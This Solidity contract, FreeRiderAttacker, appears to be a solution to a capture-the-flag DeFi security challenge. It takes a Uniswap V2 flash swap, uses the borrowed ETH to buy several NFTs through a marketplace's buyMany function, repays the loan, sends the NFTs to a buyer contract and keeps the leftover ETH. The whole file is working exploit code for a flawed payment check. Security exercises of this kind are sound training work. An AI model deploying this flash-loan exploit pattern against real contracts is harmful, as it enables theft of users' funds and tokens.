// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../WETH9.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract FreeRiderAttacker {

    IERC721Receiver private buyerContract;
    IUniswapV2Pair private pair;
    WETH9 private weth;
    IFreeRiderNFTMarketplace private marketplace;
    IERC721 public nft;
    uint[] private tokenIds;

    constructor(
        address _pair,
        address payable _marketplace,
        address _buyer,
        address _nft,
        address payable _weth
    ) {
        console.log("constructor()");
        pair = IUniswapV2Pair(_pair);
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        buyerContract = IERC721Receiver(_buyer);
        weth = WETH9(_weth);
        nft = IERC721(_nft);
    }

    function attack(uint256 nftPrice, uint256[] calldata _tokenIds) external {
        console.log("attack()", nftPrice);

        tokenIds = _tokenIds;

        bytes memory data = abi.encode(weth); //encode any random data
        pair.swap(nftPrice, 0 , address(this), data);
        console.log("balance: ",address(this).balance);

        // now we should transfer all the purchased NFTs to the buyer
        for(uint256 index = 0; index < tokenIds.length; index++ ) {
            nft.safeTransferFrom(address(this), address(buyerContract), tokenIds[index]);
        }

        console.log("balance: ",address(this).balance);
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "ETH transfer to sender failed!");
    }

    function uniswapV2Call(address, uint borrowedETH, uint amount1, bytes calldata) public {
        console.log("uniswapV2Call()", borrowedETH, amount1);
        weth.withdraw(borrowedETH);
        console.log("current balance", address(this).balance);

        marketplace.buyMany{value: address(this).balance}(tokenIds);

        uint256 flashSwapFee = ((borrowedETH * 3) / 997 + 1);
        console.log("flashSwapFee", flashSwapFee, address(this).balance);
        uint256 amountToRepay = borrowedETH + flashSwapFee;
        console.log("amountToRepay", amountToRepay, address(this).balance);
        require(address(this).balance >= amountToRepay, 'Not enough ETH to repay loan');

        //Deposit the ETH to mint WETH
        weth.deposit{value: amountToRepay}();

        //pay back the swapped tokens
        weth.transfer(address(pair), amountToRepay);
    }

    receive() external payable {}

    //Interface required to receive NFT as smart contract
    function onERC721Received(
        address, address, uint256, bytes memory
    ) external view returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}